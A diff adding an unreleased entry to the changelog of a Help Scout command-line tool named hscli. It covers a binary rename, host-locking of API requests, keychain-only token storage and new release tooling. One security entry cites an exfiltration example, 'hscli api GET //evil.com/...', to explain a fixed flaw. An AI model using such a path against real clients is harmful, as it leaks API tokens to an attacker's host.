@@ -5,6 +5,25 @@ All notable changes to this project will be documented in this file.
 The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
 and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 
+## [Unreleased]
+
+### Changed
+
+- **BREAKING: the binary is now `hscli` instead of `hs`** to avoid a global-install collision with the HubSpot CLI (which also installs `hs`). Update scripts and aliases accordingly.
+
+### Security
+
+- **`hscli api` is now host-locked.** Requests whose path resolves to any host other than `api.helpscout.net` are refused, closing a token-exfiltration vector (e.g. `hscli api GET //evil.com/...`).
+- **Token storage hard-fails when no OS keychain is available.** hscli no longer falls back to a weakly-obfuscated file; it refuses to write credentials to disk in plaintext (BREAKING for environments without a system keychain).
+- The Authorization Code login now binds the loopback callback to the fixed port `9999`, matching the Redirection URL the `hscli auth setup` wizard registers, and fails with a clear message if the port is in use.
+- All API requests now send a `hscli/<version>` `User-Agent`.
+
+### Added
+
+- `LICENSE` (MIT), `SECURITY.md`, `CODE_OF_CONDUCT.md`, issue/PR templates, and Dependabot config.
+- Automated release workflow (tag-triggered npm publish with provenance via OIDC trusted publishing + GitHub Release).
+- Test coverage is now gated at 90% in CI; `CHANGELOG.md` ships in the npm tarball.
+
 ## [0.7.0] - 2026-05-28
 
 ### Added
